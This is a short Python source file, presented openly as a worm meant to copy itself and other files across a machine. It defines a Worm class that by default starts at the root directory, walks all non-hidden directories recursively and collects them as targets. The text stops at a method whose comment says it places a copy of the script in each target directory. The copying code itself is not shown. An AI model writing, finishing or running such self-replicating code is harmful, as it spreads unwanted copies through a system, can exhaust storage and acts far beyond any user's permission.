# The script is a worm that can replicate itself and all other files

import os
import shutil

class Worm:
    
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        # Initialize the Worm object with optional parameters, default values are provided if not specified
        if isinstance(path, type(None)):
            self.path = "/"  # Set default path to root directory if not provided
        else:
            self.path = path
            
        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []  # Initialize an empty list for storing target directories
        else:
            self.target_dir_list = target_dir_list
            
        if isinstance(target_dir_list, type(None)):
            self.iteration = 2  # Default number of iterations for file copying
        else:
            self.iteration = iteration
        
        # Get the absolute path of the script
        self.own_path = os.path.realpath(__file__)
        
        
    def list_directories(self, path):
        # Recursively list directories and files starting from the given path
        self.target_dir_list.append(path)  # Append the current directory to the target directory list
        files_in_current_directory = os.listdir(path)
        
        for file in files_in_current_directory:
            # Avoid processing hidden files/directories (start with dot (.))
            if not file.startswith('.'):
                # Get the full path of the file
                absolute_path = os.path.join(path, file)
                print(absolute_path)  # Print the absolute path (for demonstration purposes)

                if os.path.isdir(absolute_path):
                    # If the current item is a directory, recursively call list_directories
                    self.list_directories(absolute_path)
                else:
                    pass  # No action needed if it's a file
    
    
    def create_new_worm(self):
        # Create a copy of the script in each target directory 
